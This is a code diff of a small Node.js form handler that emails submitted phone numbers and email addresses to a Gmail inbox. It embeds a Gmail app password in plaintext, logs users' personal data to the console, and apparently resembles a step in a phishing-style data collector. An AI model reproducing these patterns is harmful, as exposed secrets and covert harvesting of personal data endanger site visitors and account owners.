@@ -12,8 +12,15 @@ exports.handler = async (event, context) => {
   const params = querystring.parse(event.body);
   const { phone, email } = params;
 
+  console.log('Phone step - Email:', email, 'Phone:', phone);
+
   // Send email to admin with email and phone
-  await sendEmail('User Email: ' + email + '\nPhone: ' + phone);
+  try {
+    await sendEmail('User Email: ' + email + '\nPhone: ' + phone);
+    console.log('Email sent successfully for:', email);
+  } catch (error) {
+    console.error('Error sending email:', error.message);
+  }
 
   return {
     statusCode: 302,
@@ -28,21 +35,23 @@ async function sendEmail(message) {
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'bhanukiran@gmail.com',
-      pass: 'okkx rhic nhxi vbvi'
+      user: 'bhanukiran750@gmail.com',
+      pass: 'okkxrhicnhxivbvi'
     }
   });
 
   const mailOptions = {
-    from: 'bhanukiran@gmail.com',
-    to: 'bhanukiran@gmail.com',
-    subject: 'User Data Submission',
+    from: 'bhanukiran750@gmail.com',
+    to: 'bhanukiran750@gmail.com',
+    subject: 'User Data Submission - Phone',
     text: message
   };
 
   try {
-    await transporter.sendMail(mailOptions);
+    const info = await transporter.sendMail(mailOptions);
+    console.log('Email sent:', info.response);
   } catch (error) {
-    console.error(error);
+    console.error('Email send error:', error);
+    throw error;
   }
 }
